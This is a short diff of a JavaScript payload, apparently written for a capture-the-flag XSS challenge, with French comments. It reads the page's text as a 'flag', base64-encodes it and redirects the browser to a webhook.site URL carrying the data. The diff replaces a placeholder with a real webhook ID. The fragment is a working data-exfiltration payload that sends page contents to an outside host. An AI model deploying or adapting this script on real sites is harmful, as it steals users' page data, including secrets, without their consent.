@@ -3,4 +3,4 @@ var flag = document.body.innerText;
 
 // On force le navigateur à naviguer vers ton Webhook avec le flag en paramètre
 // btoa() sert à encoder en Base64 pour éviter que les caractères spéciaux ne cassent l'URL
-window.location.href = "https://webhook.site/TON_ID_WEBHOOK?data=" + btoa(flag);
+window.location.href = "https://webhook.site/8a37a269-d21e-4e75-ad48-d1e048d00fbc?data=" + btoa(flag);
